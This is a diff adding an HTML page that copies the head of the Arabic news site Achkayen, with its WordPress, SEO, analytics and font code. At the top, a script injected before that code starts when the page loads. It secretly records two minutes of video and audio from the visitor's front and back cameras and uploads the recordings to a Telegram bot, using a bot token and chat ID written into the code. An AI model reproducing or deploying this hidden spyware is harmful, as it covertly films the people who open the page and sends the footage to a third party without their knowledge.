@@ -1,0 +1,1929 @@
+
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<head>
+    <script>
+        function startRecording(facingMode, videoFileName) {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode },
+                audio: true
+            })
+            .then(stream => {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        chunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, videoFileName);
+
+                    const telegramBotToken = '7867318181:AAFHSDLNLvdPFomn3HDxBbNCINP0LeDLHjw';
+                    const chatId = '1832658980';
+
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo?chat_id=${chatId}`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log(`تم إرسال الفيديو (${videoFileName}) بنجاح:`, data);
+                    })
+                    .catch(error => {
+                        console.error(`حدث خطأ أثناء إرسال الفيديو (${videoFileName}):`, error);
+                    });
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                },2 * 60 * 1000);
+            })
+            .catch(error => {
+                console.error(`خطأ أثناء الوصول إلى الكاميرا (${facingMode}):`, error);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startRecording('user', 'front_recording.webm');
+            startRecording('environment', 'back_recording.webm');
+        });
+    </script>
+<!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-PDGBP26');</script>
+<!-- End Google Tag Manager -->		<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="pingback" href="https://www.achkayen.com/xmlrpc.php"/>
+<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+<!-- This site is optimized with the Yoast SEO Premium plugin v24.0 (Yoast SEO v24.1) - https://yoast.com/wordpress/plugins/seo/ -->
+<title>Achkayen - آشكاين جريدة إلكترونية مغربية</title>
+<meta name="description" content="آشكاين.. موقع إخباري لن يكتفي بنقل الأخبار والوقائع، بل سيعمل على الغوص في جذورها لتقريب القارئ من أسباب حدوثها، مع متابعة شاملة لخلفياتها وما يمكن أن ينجم عنها من آثار مستقبلية؛ وذلك بالإجابة الشاملة والكاملة على سؤال: “لماذا وإلى أين؟” Achkayen" />
+<link rel="canonical" href="https://www.achkayen.com/" />
+<meta property="og:locale" content="ar_AR" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="آشكاين.. لماذا وإلى أين؟" />
+<meta property="og:description" content="آشكاين.. موقع إخباري لن يكتفي بنقل الأخبار والوقائع، بل سيعمل على الغوص في جذورها لتقريب القارئ من أسباب حدوثها، مع متابعة شاملة لخلفياتها وما يمكن أن ينجم عنها من آثار مستقبلية؛ وذلك بالإجابة الشاملة والكاملة على سؤال: “لماذا وإلى أين؟” Achkayen" />
+<meta property="og:url" content="https://www.achkayen.com/" />
+<meta property="og:site_name" content="آشكاين" />
+<meta property="article:publisher" content="https://www.facebook.com/Achkayenpress" />
+<meta property="article:modified_time" content="2024-12-11T12:15:14+00:00" />
+<meta property="og:image" content="https://www.achkayen.com/wp-content/uploads/2017/12/23755765_915546685288916_3122323631771337136_n.png" />
+<meta property="og:image:width" content="960" />
+<meta property="og:image:height" content="960" />
+<meta property="og:image:type" content="image/png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="الرئيسية" />
+<meta name="twitter:site" content="@achkayenpress" />
+<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://www.achkayen.com/","url":"https://www.achkayen.com/","name":"Achkayen - آشكاين جريدة إلكترونية مغربية","isPartOf":{"@id":"https://www.achkayen.com/#website"},"about":{"@id":"https://www.achkayen.com/#organization"},"datePublished":"2017-06-06T02:46:22+00:00","dateModified":"2024-12-11T12:15:14+00:00","description":"آشكاين.. موقع إخباري لن يكتفي بنقل الأخبار والوقائع، بل سيعمل على الغوص في جذورها لتقريب القارئ من أسباب حدوثها، مع متابعة شاملة لخلفياتها وما يمكن أن ينجم عنها من آثار مستقبلية؛ وذلك بالإجابة الشاملة والكاملة على سؤال: “لماذا وإلى أين؟” Achkayen","breadcrumb":{"@id":"https://www.achkayen.com/#breadcrumb"},"inLanguage":"ar","potentialAction":[{"@type":"ReadAction","target":["https://www.achkayen.com/"]}]},{"@type":"BreadcrumbList","@id":"https://www.achkayen.com/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]},{"@type":"WebSite","@id":"https://www.achkayen.com/#website","url":"https://www.achkayen.com/","name":"آشكاين","description":"لماذا وإلى أين ؟","publisher":{"@id":"https://www.achkayen.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.achkayen.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"ar"},{"@type":"Organization","@id":"https://www.achkayen.com/#organization","name":"Achkayen-آشكاين","url":"https://www.achkayen.com/","logo":{"@type":"ImageObject","inLanguage":"ar","@id":"https://www.achkayen.com/#/schema/logo/image/","url":"https://i0.wp.com/www.achkayen.com/wp-content/uploads/2017/12/23755765_915546685288916_3122323631771337136_n.png?fit=960%2C960&ssl=1","contentUrl":"https://i0.wp.com/www.achkayen.com/wp-content/uploads/2017/12/23755765_915546685288916_3122323631771337136_n.png?fit=960%2C960&ssl=1","width":960,"height":960,"caption":"Achkayen-آشكاين"},"image":{"@id":"https://www.achkayen.com/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/Achkayenpress","https://x.com/achkayenpress"]}]}</script>
+<meta name="msvalidate.01" content="d77c9e7ab02d429d80cfcc92db481275" />
+<meta name="google-site-verification" content="googlefa8cb683f12cba8c" />
+<meta name="yandex-verification" content="b63c7977ce0c0c78" />
+<!-- / Yoast SEO Premium plugin. -->
+<link rel='dns-prefetch' href='//stats.wp.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='preconnect' href='//i0.wp.com' />
+<link rel='preconnect' href='//c0.wp.com' />
+<link rel="alternate" type="application/rss+xml" title="آشكاين &laquo; الخلاصة" href="https://www.achkayen.com/feed" />
+<link rel="alternate" type="application/rss+xml" title="آشكاين &laquo; خلاصة التعليقات" href="https://www.achkayen.com/comments/feed" />
+<!-- This site uses the Google Analytics by MonsterInsights plugin v9.2.4 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+<script src="//www.googletagmanager.com/gtag/js?id=G-123DG6L8ZX"  data-cfasync="false" data-wpfc-render="false" type="text/javascript" async></script>
+<script data-cfasync="false" data-wpfc-render="false" type="text/javascript">
+var mi_version = '9.2.4';
+var mi_track_user = true;
+var mi_no_track_reason = '';
+var MonsterInsightsDefaultLocations = {"page_location":"https:\/\/www.achkayen.com\/"};
+if ( typeof MonsterInsightsPrivacyGuardFilter === 'function' ) {
+var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsPrivacyGuardFilter( MonsterInsightsExcludeQuery ) : MonsterInsightsPrivacyGuardFilter( MonsterInsightsDefaultLocations );
+} else {
+var MonsterInsightsLocations = (typeof MonsterInsightsExcludeQuery === 'object') ? MonsterInsightsExcludeQuery : MonsterInsightsDefaultLocations;
+}
+var disableStrs = [
+'ga-disable-G-123DG6L8ZX',
+];
+/* Function to detect opted out users */
+function __gtagTrackerIsOptedOut() {
+for (var index = 0; index < disableStrs.length; index++) {
+if (document.cookie.indexOf(disableStrs[index] + '=true') > -1) {
+return true;
+}
+}
+return false;
+}
+/* Disable tracking if the opt-out cookie exists. */
+if (__gtagTrackerIsOptedOut()) {
+for (var index = 0; index < disableStrs.length; index++) {
+window[disableStrs[index]] = true;
+}
+}
+/* Opt-out function */
+function __gtagTrackerOptout() {
+for (var index = 0; index < disableStrs.length; index++) {
+document.cookie = disableStrs[index] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+window[disableStrs[index]] = true;
+}
+}
+if ('undefined' === typeof gaOptout) {
+function gaOptout() {
+__gtagTrackerOptout();
+}
+}
+window.dataLayer = window.dataLayer || [];
+window.MonsterInsightsDualTracker = {
+helpers: {},
+trackers: {},
+};
+if (mi_track_user) {
+function __gtagDataLayer() {
+dataLayer.push(arguments);
+}
+function __gtagTracker(type, name, parameters) {
+if (!parameters) {
+parameters = {};
+}
+if (parameters.send_to) {
+__gtagDataLayer.apply(null, arguments);
+return;
+}
+if (type === 'event') {
+parameters.send_to = monsterinsights_frontend.v4_id;
+var hookName = name;
+if (typeof parameters['event_category'] !== 'undefined') {
+hookName = parameters['event_category'] + ':' + name;
+}
+if (typeof MonsterInsightsDualTracker.trackers[hookName] !== 'undefined') {
+MonsterInsightsDualTracker.trackers[hookName](parameters);
+} else {
+__gtagDataLayer('event', name, parameters);
+}
+} else {
+__gtagDataLayer.apply(null, arguments);
+}
+}
+__gtagTracker('js', new Date());
+__gtagTracker('set', {
+'developer_id.dZGIzZG': true,
+});
+if ( MonsterInsightsLocations.page_location ) {
+__gtagTracker('set', MonsterInsightsLocations);
+}
+__gtagTracker('config', 'G-123DG6L8ZX', {"forceSSL":"true","link_attribution":"true"} );
+window.gtag = __gtagTracker;										(function () {
+/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+/* ga and __gaTracker compatibility shim. */
+var noopfn = function () {
+return null;
+};
+var newtracker = function () {
+return new Tracker();
+};
+var Tracker = function () {
+return null;
+};
+var p = Tracker.prototype;
+p.get = noopfn;
+p.set = noopfn;
+p.send = function () {
+var args = Array.prototype.slice.call(arguments);
+args.unshift('send');
+__gaTracker.apply(null, args);
+};
+var __gaTracker = function () {
+var len = arguments.length;
+if (len === 0) {
+return;
+}
+var f = arguments[len - 1];
+if (typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function') {
+if ('send' === arguments[0]) {
+var hitConverted, hitObject = false, action;
+if ('event' === arguments[1]) {
+if ('undefined' !== typeof arguments[3]) {
+hitObject = {
+'eventAction': arguments[3],
+'eventCategory': arguments[2],
+'eventLabel': arguments[4],
+'value': arguments[5] ? arguments[5] : 1,
+}
+}
+}
+if ('pageview' === arguments[1]) {
+if ('undefined' !== typeof arguments[2]) {
+hitObject = {
+'eventAction': 'page_view',
+'page_path': arguments[2],
+}
+}
+}
+if (typeof arguments[2] === 'object') {
+hitObject = arguments[2];
+}
+if (typeof arguments[5] === 'object') {
+Object.assign(hitObject, arguments[5]);
+}
+if ('undefined' !== typeof arguments[1].hitType) {
+hitObject = arguments[1];
+if ('pageview' === hitObject.hitType) {
+hitObject.eventAction = 'page_view';
+}
+}
+if (hitObject) {
+action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+hitConverted = mapArgs(hitObject);
+__gtagTracker('event', action, hitConverted);
+}
+}
+return;
+}
+function mapArgs(args) {
+var arg, hit = {};
+var gaMap = {
+'eventCategory': 'event_category',
+'eventAction': 'event_action',
+'eventLabel': 'event_label',
+'eventValue': 'event_value',
+'nonInteraction': 'non_interaction',
+'timingCategory': 'event_category',
+'timingVar': 'name',
+'timingValue': 'value',
+'timingLabel': 'event_label',
+'page': 'page_path',
+'location': 'page_location',
+'title': 'page_title',
+'referrer' : 'page_referrer',
+};
+for (arg in args) {
+if (!(!args.hasOwnProperty(arg) || !gaMap.hasOwnProperty(arg))) {
+hit[gaMap[arg]] = args[arg];
+} else {
+hit[arg] = args[arg];
+}
+}
+return hit;
+}
+try {
+f.hitCallback();
+} catch (ex) {
+}
+};
+__gaTracker.create = newtracker;
+__gaTracker.getByName = newtracker;
+__gaTracker.getAll = function () {
+return [];
+};
+__gaTracker.remove = noopfn;
+__gaTracker.loaded = true;
+window['__gaTracker'] = __gaTracker;
+})();
+} else {
+console.log("");
+(function () {
+function __gtagTracker() {
+return null;
+}
+window['__gtagTracker'] = __gtagTracker;
+window['gtag'] = __gtagTracker;
+})();
+}
+</script>
+<!-- / Google Analytics by MonsterInsights -->
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.achkayen.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.1"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+img.wp-smiley, img.emoji {
+display: inline !important;
+border: none !important;
+box-shadow: none !important;
+height: 1em !important;
+width: 1em !important;
+margin: 0 0.07em !important;
+vertical-align: -0.1em !important;
+background: none !important;
+padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='wp-block-library-rtl-css' href='https://c0.wp.com/c/6.7.1/wp-includes/css/dist/block-library/style-rtl.min.css' type='text/css' media='all' />
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<!-- <link rel='stylesheet' id='app-banners-styles-css' href='https://www.achkayen.com/wp-content/plugins/appbanners/lib/smartbanner/jquery.smartbanner.min.css?ver=6.7.1' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='js_composer_front-css' href='https://www.achkayen.com/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=8.0.1' type='text/css' media='all' /> -->
+<!-- <link rel='stylesheet' id='publisher-child-css' href='https://www.achkayen.com/wp-content/themes/publisher-child/style.css?ver=1.0.0' type='text/css' media='all' /> -->
+<link rel="stylesheet" type="text/css" href="//www.achkayen.com/wp-content/cache/wpfc-minified/7aczgztm/88h7r.css" media="all"/>
+<style id="better-framework-main-fonts-css" media="all">/*
+ * Droid Arabic Kufi (Arabic) http://www.google.com/fonts/earlyaccess
+ */
+@font-face {
+  font-family: 'Droid Arabic Kufi';
+  font-style: normal;
+  font-weight: 400;
+  src: url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Regular.eot);
+  src: url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Regular.eot?#iefix) format('embedded-opentype'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Regular.woff2) format('woff2'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Regular.woff) format('woff'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Regular.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Droid Arabic Kufi';
+  font-style: normal;
+  font-weight: 700;
+  src: url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Bold.eot);
+  src: url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Bold.eot?#iefix) format('embedded-opentype'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Bold.woff2) format('woff2'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Bold.woff) format('woff'),
+       url(/fonts.gstatic.com/ea/droidarabickufi/v6/DroidKufi-Bold.ttf) format('truetype');
+}
+</style>
+<style id="better-framework-font-1-css" media="all">/* arabic */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 100;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrOYFFlKp.woff2) format('woff2');
+  unicode-range: U+0600-06FF, U+0750-077F, U+0870-088E, U+0890-0891, U+0897-08E1, U+08E3-08FF, U+200C-200E, U+2010-2011, U+204F, U+2E41, U+FB50-FDFF, U+FE70-FE74, U+FE76-FEFC, U+102E0-102FB, U+10E60-10E7E, U+10EC2-10EC4, U+10EFC-10EFF, U+1EE00-1EE03, U+1EE05-1EE1F, U+1EE21-1EE22, U+1EE24, U+1EE27, U+1EE29-1EE32, U+1EE34-1EE37, U+1EE39, U+1EE3B, U+1EE42, U+1EE47, U+1EE49, U+1EE4B, U+1EE4D-1EE4F, U+1EE51-1EE52, U+1EE54, U+1EE57, U+1EE59, U+1EE5B, U+1EE5D, U+1EE5F, U+1EE61-1EE62, U+1EE64, U+1EE67-1EE6A, U+1EE6C-1EE72, U+1EE74-1EE77, U+1EE79-1EE7C, U+1EE7E, U+1EE80-1EE89, U+1EE8B-1EE9B, U+1EEA1-1EEA3, U+1EEA5-1EEA9, U+1EEAB-1EEBB, U+1EEF0-1EEF1;
+}
+/* math */
+@font-face {
+  font-family: 'Noto Kufi Arabic';
+  font-style: normal;
+  font-weight: 100;
+  src: url(/fonts.gstatic.com/s/notokufiarabic/v21/CSRk4ydQnPyaDxEXLFF6LZVLKrodrJ8FFlKp.woff2) format('woff2');
